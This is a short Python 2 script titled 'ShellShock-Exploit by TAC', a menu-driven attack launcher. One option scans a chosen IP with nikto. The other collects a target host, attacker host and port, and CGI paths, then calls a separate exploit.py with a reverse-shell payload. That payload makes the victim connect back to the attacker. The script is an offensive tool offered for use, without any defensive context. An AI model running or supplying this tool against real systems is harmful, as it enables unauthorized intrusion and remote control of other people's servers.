#!/bin/env python

import os
from os import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import requests
import sys
from socket import *
from threading import Thread
import thread, time, httplib, urllib

print """
         ShellShock-Exploit by TAC
    (1): Detect ShellShock Vulnerability
    (2): ShellShock Exploit {Easy}
"""
select = int(input("[!]Select a option: "))
if select == 1:
    os.system('echo enter the IP: && read ip && nikto -h $ip')
elif select == 2:
    os.system('echo enter the Rhost: && read vich && echo enter the lhost: && read lh && echo enter the lport: && read lp && echo enter cgi pages: if you dont want skip it press enter seperated by comma: && read pg && python exploit.py payload=reverse rhost=$vich lhost=$lh lport=$lp pages=$pg')
else:
    print("[-]Invalid Option!")
